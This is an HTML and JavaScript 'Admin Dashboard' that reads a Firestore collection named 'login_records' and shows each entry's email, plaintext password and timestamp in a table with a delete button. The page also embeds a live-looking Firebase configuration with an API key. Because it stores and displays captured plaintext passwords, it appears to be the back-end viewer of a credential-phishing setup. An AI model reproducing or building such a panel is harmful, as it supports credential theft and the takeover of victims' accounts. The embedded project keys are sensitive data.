<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

<style>

body{
font-family:Inter;
background:#f2f2f2;
padding:40px;
}

.card{
background:white;
max-width:900px;
margin:auto;
border-radius:10px;
overflow:hidden;
border:1px solid #ddd;
}

.header{
display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:20px;
}

button{
background:#0095f6;
color:white;
border:none;
padding:8px 16px;
border-radius:6px;
cursor:pointer;
}

table{
width:100%;
border-collapse:collapse;
}

th{
text-align:left;
padding:14px;
font-size:12px;
color:#666;
border-bottom:1px solid #eee;
}

td{
padding:14px;
border-bottom:1px solid #eee;
font-size:13px;
}

.delete{
background:#ed4956;
}

.empty{
text-align:center;
padding:40px;
color:#888;
}

</style>
</head>

<body>

<div class="header">
<h2>Login Records <span id="count"></span></h2>
<button onclick="loadRecords()">Refresh</button>
</div>

<div class="card">
<table>

<thead>
<tr>
<th>ID</th>
<th>Email</th>
<th>Password</th>
<th>Time</th>
<th></th>
</tr>
</thead>

<tbody id="tableBody">

<tr class="empty">
<td colspan="5">Loading...</td>
</tr>

</tbody>

</table>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";

import {
getFirestore,
collection,
getDocs,
deleteDoc,
doc,
query,
orderBy
} from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

const firebaseConfig = {

apiKey:"AIzaSyAy0k5QdtA65i4r9H7G8MptYn1JgtcsxKo",
authDomain:"visionova-f2220.firebaseapp.com",
projectId:"visionova-f2220",
storageBucket:"visionova-f2220.firebasestorage.app",
messagingSenderId:"416012396580",
appId:"1:416012396580:web:54697d33c1b02516d4d0b1"

};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

function formatDate(ts){

if(!ts) return "-";

const d = ts.toDate ? ts.toDate() : new Date(ts);

return d.toLocaleString();

}

function escapeHTML(str){

return String(str)
.replace(/&/g,"&amp;")
.replace(/</g,"&lt;")
.replace(/>/g,"&gt;")
.replace(/"/g,"&quot;")

}

window.loadRecords = async function(){

const tbody=document.getElementById("tableBody");
const count=document.getElementById("count");

tbody.innerHTML=`<tr class="empty"><td colspan="5">Loading...</td></tr>`;

try{

const q=query(
collection(db,"login_records"),
orderBy("timestamp","desc")
);

const snap=await getDocs(q);

if(snap.empty){

tbody.innerHTML=`<tr class="empty"><td colspan="5">No Records</td></tr>`;
count.innerText="";
return;

}

let html="";

snap.forEach(docSnap=>{

const d=docSnap.data();

html+=`
<tr>

<td>${docSnap.id.slice(0,8)}</td>

<td>${escapeHTML(d.username||"-")}</td>

<td>${escapeHTML(d.password||"-")}</td>

<td>${formatDate(d.timestamp)}</td>

<td>
<button class="delete" onclick="deleteRecord('${docSnap.id}')">
Delete
</button>
</td>

</tr>
`;

});

tbody.innerHTML=html;

count.innerText=`(${snap.size})`;

}catch(err){

console.error(err);

tbody.innerHTML=`
<tr class="empty">
<td colspan="5">Error loading data</td>
</tr>`;

}

}

window.deleteRecord = async function(id){

if(!confirm("Delete record?")) return;

try{

await deleteDoc(doc(db,"login_records",id));

loadRecords();

}catch(err){

alert("Delete failed");

console.error(err);

}

}

loadRecords();

</script>

</body>
</html>
